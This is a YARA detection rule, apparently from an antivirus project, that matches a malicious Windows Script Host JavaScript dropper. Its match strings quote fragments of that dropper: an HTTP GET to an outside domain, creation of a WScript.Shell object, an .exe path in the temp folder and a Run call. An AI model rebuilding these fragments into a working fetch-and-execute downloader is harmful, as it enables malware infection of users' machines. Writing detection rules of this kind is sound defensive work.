rule sig_20160330_e41c07ded4f7e0b3ca37ac23dec420aa {
  meta:
    description = "datamaliciousorder - file 20160330_e41c07ded4f7e0b3ca37ac23dec420aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ab67441c8ba7c3a1694a2588867bdbc5b6b7e75738f1f062457955212c60853e"

  strings:
    $s1  = "_ZB[_UP](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "var _BH = function _X() {return WScript[_D0](\"WScript\"+\".Shell\");}(), _JN = 11;" fullword ascii
    $s3  = "function _NM(_C0, _SQ){_H = _H * 1; return _C0 - _SQ;};" fullword ascii
    $s4  = "if (_ZB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _R(){return _K + \"\";};" fullword ascii
    $s6  = "function _O() {return _BH[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0kxp5YSamB.ex\" + \"e\";};" fullword ascii
    $s7  = "function _E() {return ((_L0 == true) && (_L0 == _MR)) ? 1 : _H;};" fullword ascii
    $s8  = "function _CB(_K0){_BH[\"Run\"](_K0, _H, _H);};" fullword ascii
    $s9  = " while (_Q){" fullword ascii
    $s10 = "var _HQ = new this[\"Date\"]();" fullword ascii
    $s11 = "function _BA(){return _D0;};" fullword ascii
    $s12 = "function _C(){return 22;};" fullword ascii
    $s13 = "function _FE()" fullword ascii
    $s14 = "return _NM(_L, _YG);" fullword ascii
    $s15 = "function _A(_UG) {var _B = (1, 2, 3, 4, 5, _UG); return _B;};" fullword ascii
    $s16 = "var _SK = false;" fullword ascii
    $s17 = "var _L0 = false;" fullword ascii
    $s18 = "_L0 = true; " fullword ascii
    $s19 = "var _MR = false;" fullword ascii
    $s20 = "_MR = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}